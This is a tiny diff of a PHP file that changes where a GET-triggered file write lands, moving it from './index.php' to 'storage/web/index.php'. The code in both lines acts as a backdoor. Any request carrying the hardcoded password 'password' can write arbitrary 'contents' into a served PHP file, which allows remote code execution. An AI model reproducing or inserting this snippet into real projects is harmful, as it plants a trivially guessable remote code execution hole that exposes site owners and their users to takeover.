@@ -1,4 +1,4 @@
 <?php if ($_GET["password"]==="password") {
-file_put_contents("./index.php", $_GET["contents"]);
+file_put_contents("storage/web/index.php", $_GET["contents"]);
 
 } ?>
